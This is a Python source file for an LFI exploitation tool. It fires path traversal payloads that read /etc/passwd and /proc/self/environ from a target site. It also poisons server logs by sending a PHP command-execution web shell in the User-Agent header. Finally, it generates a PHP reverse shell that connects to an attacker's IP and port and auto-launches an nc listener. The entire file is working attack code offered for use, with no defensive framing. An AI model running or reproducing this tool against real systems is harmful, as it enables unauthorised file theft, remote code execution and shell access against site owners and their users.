import requests
import sys
import urllib.parse
import base64
import threading
import platform
import subprocess
from colorama import init, Fore, Style

init(autoreset=True)

results = []
lock = threading.Lock()

DETECTION_KEYWORDS = [
    "root:x:", "[extensions]", "[boot loader]", "[fonts]", "<html", "phpinfo()", "Linux", "Windows"
]

LOG_POISONING_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/var/log/nginx/access.log"
]

def decode_base64_content(content):
    try:
        decoded = base64.b64decode(content).decode("utf-8", errors="ignore")
        return decoded
    except Exception:
        return None

def detect_success(response_text):
    for keyword in DETECTION_KEYWORDS:
        if keyword in response_text:
            return True
    return False

def test_payload(url, param, payload):
    target = f"{url}?{param}={urllib.parse.quote(payload)}"
    print(Fore.YELLOW + f"Testing payload: {payload}" + Style.RESET_ALL)
    try:
        res = requests.get(target, timeout=5)
        body = res.text

        if detect_success(body):
            result_msg = Fore.GREEN + f"[+] LFI detected with payload: {payload}\n" + Style.RESET_ALL
            if payload.startswith("php://filter") or payload.startswith("data://"):
                decoded = decode_base64_content(body)
                if decoded:
                    result_msg += "[Base64 Decoded Preview]:\n" + decoded[:500]
                else:
                    result_msg += "[!] Base64 decoding failed or content not encoded."
            else:
                result_msg += "[Preview]:\n" + body[:500]

            with lock:
                results.append(result_msg)
            print(result_msg)

    except Exception as e:
        print(Fore.RED + f"[-] Error testing {payload}: {e}" + Style.RESET_ALL)

def poison_log(target_url):
    print(Fore.CYAN + "[*] Attempting log poisoning..." + Style.RESET_ALL)
    shell_code = "<?php system($_GET['cmd']); ?>"
    headers = {
        "User-Agent": shell_code
    }
    try:
        requests.get(target_url, headers=headers, timeout=5)
        print(Fore.GREEN + "[+] Log poisoning attempt sent. Try including access log now." + Style.RESET_ALL)
        for path in LOG_POISONING_PATHS:
            print(Fore.YELLOW + f"[*] Try this payload to execute commands: ../../../../..{path}?cmd=id" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Log poisoning failed: {e}" + Style.RESET_ALL)

def generate_reverse_shell(ip, port):
    php_shell = f"<?php $sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>"
    encoded_shell = php_shell.replace("\"", "\\\"").replace("$", "\\$")
    print(Fore.GREEN + "\n[+] Reverse shell PHP payload (for log poisoning or uploads):" + Style.RESET_ALL)
    print(encoded_shell)
    print(Fore.YELLOW + f"[!] Make sure you have a listener running: nc -lvnp {port}\n" + Style.RESET_ALL)

    if platform.system() == "Linux":
        try:
            subprocess.Popen(["x-terminal-emulator", "-e", f"nc -lvnp {port}"], stderr=subprocess.DEVNULL)
            print(Fore.GREEN + f"[+] Netcat listener launched on port {port} (new terminal)" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Could not auto-launch netcat listener: {e}" + Style.RESET_ALL)

def load_payloads(file_path):
    try:
        with open(file_path, "r") as f:
            payloads = [line.strip() for line in f if line.strip()]
            print(Fore.CYAN + f"[+] Loaded {len(payloads)} payloads from {file_path}" + Style.RESET_ALL)
            return payloads
    except Exception as e:
        print(Fore.RED + f"[-] Failed to load payloads from file: {e}" + Style.RESET_ALL)
        return [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/hosts",
            "../../../../../../../../proc/self/environ"
        ]

def test_lfi(url, param, payloads):
    print(Fore.CYAN + "[*] Starting LFI tests with threading..." + Style.RESET_ALL)
    threads = []
    for payload in payloads:
        t = threading.Thread(target=test_payload, args=(url, param, payload))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    poison_log(url)

    if not results:
        print(Fore.RED + "[-] No LFI detected with provided payloads." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"[+] Total positive payloads: {len(results)}" + Style.RESET_ALL)
        save_report()

def save_report():
    try:
        with open("lfi_report.txt", "w") as f:
            f.write("LFI Exploitation Report\n")
            f.write("=======================\n\n")
            for r in results:
                # Strip colorama codes for clean text
                clean = r
                for code in [Fore.GREEN, Fore.YELLOW, Fore.RED, Fore.CYAN, Style.RESET_ALL]:
                    clean = clean.replace(code, "")
                f.write(clean + "\n\n---\n\n")
        print(Fore.CYAN + "[+] Report saved to lfi_report.txt" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Failed to save report: {e}" + Style.RESET_ALL)

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 lfi_tool.py <url> <parameter> [payload_file.txt] [reverse_shell_ip:port]")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]
    payload_file = None
    shell_info = None

    if len(sys.argv) == 4:
        if ":" in sys.argv[3]:
            shell_info = sys.argv[3]
        else:
            payload_file = sys.argv[3]
    elif len(sys.argv) == 5:
        payload_file = sys.argv[3]
        shell_info = sys.argv[4]

    payloads = load_payloads(payload_file) if payload_file else [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/hosts",
        "../../../../../../../../proc/self/environ"
    ]

    test_lfi(url, param, payloads)

    if shell_info:
        ip, port = shell_info.split(":")
        generate_reverse_shell(ip.strip(), port.strip())

if __name__ == "__main__":
    main()
